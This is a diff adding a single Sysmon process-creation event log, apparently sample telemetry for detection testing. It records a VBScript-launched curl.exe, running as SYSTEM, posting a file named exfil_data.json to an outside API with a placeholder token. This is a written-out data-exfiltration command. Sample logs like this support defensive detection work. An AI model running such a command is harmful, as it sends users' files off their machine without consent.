@@ -1,0 +1,45 @@
+<Events>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2024-03-10T02:44:18.993127500Z"/>
+      <EventRecordID>67234</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="1080" ThreadID="5528"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>FINANCE-PC03</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2024-03-10 02:44:18.993</Data>
+      <Data Name="ProcessGuid">{e8b2c4d6-f1a3-6612-bb00-000000003100}</Data>
+      <Data Name="ProcessId">21448</Data>
+      <Data Name="Image">C:\Windows\System32\curl.exe</Data>
+      <Data Name="FileVersion">8.4.0</Data>
+      <Data Name="Description">The curl executable</Data>
+      <Data Name="Product">The curl executable</Data>
+      <Data Name="Company">curl, https://curl.se/</Data>
+      <Data Name="OriginalFileName">curl.exe</Data>
+      <Data Name="CommandLine">curl.exe -X POST https://api.openai.com/v1/chat/completions -H "Authorization: Bearer sk-proj-abc123" -d @C:\Users\Public\exfil_data.json</Data>
+      <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
+      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+      <Data Name="LogonGuid">{e8b2c4d6-0001-6612-e703-000000000000}</Data>
+      <Data Name="LogonId">0x3E7</Data>
+      <Data Name="TerminalSessionId">0</Data>
+      <Data Name="IntegrityLevel">System</Data>
+      <Data Name="Hashes">SHA256=D4C2E3F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3</Data>
+      <Data Name="ParentProcessGuid">{e8b2c4d6-ee12-6612-a900-000000003100}</Data>
+      <Data Name="ParentProcessId">18776</Data>
+      <Data Name="ParentImage">C:\Windows\System32\wscript.exe</Data>
+      <Data Name="ParentCommandLine">wscript.exe "C:\ProgramData\update_check.vbs"</Data>
+      <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
+    </EventData>
+  </Event>
+</Events>
